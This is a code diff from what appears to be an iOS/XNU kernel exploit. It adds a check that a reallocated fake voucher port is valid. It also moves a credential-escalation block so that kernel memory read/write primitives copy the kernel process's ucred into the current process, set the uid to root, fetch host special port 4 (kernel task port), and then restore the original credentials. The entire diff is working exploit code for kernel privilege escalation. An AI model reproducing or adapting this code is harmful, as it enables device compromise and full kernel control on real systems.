@@ -1039,6 +1039,13 @@ found_voucher_lbl:;
 
     the_one = real_port_to_fake_voucher;
 
+    if (!MACH_PORT_VALID(the_one))
+    {
+        LOG("the_one is not valid :-( failed to realloc");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
     LOG("WE REALLY TRAPPIN OUT HERE");
 
     /* find the index of the pipe buffer our fakeport overlapped with */
@@ -1485,19 +1492,6 @@ value = value | ((uint64_t)read64_tmp << 32);\
 
     LOG("got kernproc: %llx", kernproc);
 
-    /* eleveate creds to kernel */
-    
-    uint64_t kern_ucred = kread64(kernproc + offsets->struct_offsets.proc_ucred);
-    kwrite64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
-    
-    LOG("setuid: %d, uid: %d", setuid(0), getuid());
-    if (getuid() != 0)
-    {
-        LOG("failed to elevate to root/kernel creds!");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-
     /* kernproc->task->vm_map */
 
     uint64_t kerntask = kread64(kernproc + offsets->struct_offsets.proc_task);
@@ -1570,8 +1564,39 @@ value = value | ((uint64_t)read64_tmp << 32);\
     */
     kwrite64(offsets->data.realhost + kslide + 0x10 + (sizeof(uint64_t) * 4), new_port);
 
+    /* eleveate creds to kernel */
+    
+    uint64_t orig_ucred = kread64(ourproc + offsets->struct_offsets.proc_ucred);
+    LOG("original ucred: 0x%llx", orig_ucred);
+
+    int orig_uid = getuid();
+
+    uint64_t kern_ucred = kread64(kernproc + offsets->struct_offsets.proc_ucred);
+    kwrite64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
+    
+    LOG("setuid: %d, uid: %d", setuid(0), getuid());
+    if (getuid() != 0)
+    {
+        LOG("failed to elevate to root/kernel creds!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
     mach_port_t hsp4;
     ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
+    
+    /* de-elevate */
+
+    kwrite64(ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
+    
+    LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
+    if (getuid() != orig_uid)
+    {
+        LOG("failed to de-elelvate to uid: %d", orig_uid);
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
     if (ret != KERN_SUCCESS ||
         !MACH_PORT_VALID(hsp4))
     {
